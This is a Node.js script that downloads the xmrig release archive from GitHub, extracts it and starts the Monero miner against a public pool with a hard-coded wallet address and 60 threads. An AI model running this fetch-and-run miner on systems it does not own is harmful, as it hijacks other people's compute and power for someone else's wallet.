const { exec } = require('child_process');

async function runCommands() {
  try {
    // Step 1: Download xmrig using curl
    console.log('Downloading xmrig...');
    await executeCommand('curl -LO https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz');
    console.log('Download complete.');

    // Step 2: Extract the tar.gz file
    console.log('Extracting tar.gz file...');
    await executeCommand('tar -xf xmrig-6.21.0-linux-x64.tar.gz');
    console.log('Extraction complete.');

    // Step 3: Change directory to xmrig-6.21.0
    console.log('Changing directory to xmrig-6.21.0...');
    process.chdir('xmrig-6.21.0');
    console.log('Current directory:', process.cwd());

    // Step 4: Run the xmrig command
    console.log('Running xmrig...');
    const xmrigCommand = './xmrig --donate-level 5 -o xmr.2miners.com:2222 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p R#2 -k --coin monero --threads 60 --max-cpu-usage 60';
    await executeCommand(xmrigCommand);
    console.log('xmrig started successfully.');
  } catch (error) {
    console.error('Error:', error.message);
  }
}

// Function to execute a command
/* function executeCommand(command) {
//  return new Promise((resolve, reject) => {
//    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        resolve({ stdout, stderr });
      }
    });
  });
} */
// Function to execute a command
function executeCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      console.log('Command:', command);
      console.log('stdout:', stdout);
      console.error('stderr:', stderr);

      if (error) {
        reject(error);
      } else {
        resolve({ stdout, stderr });
      }
    });
  });
}

// Run the main function
runCommands();
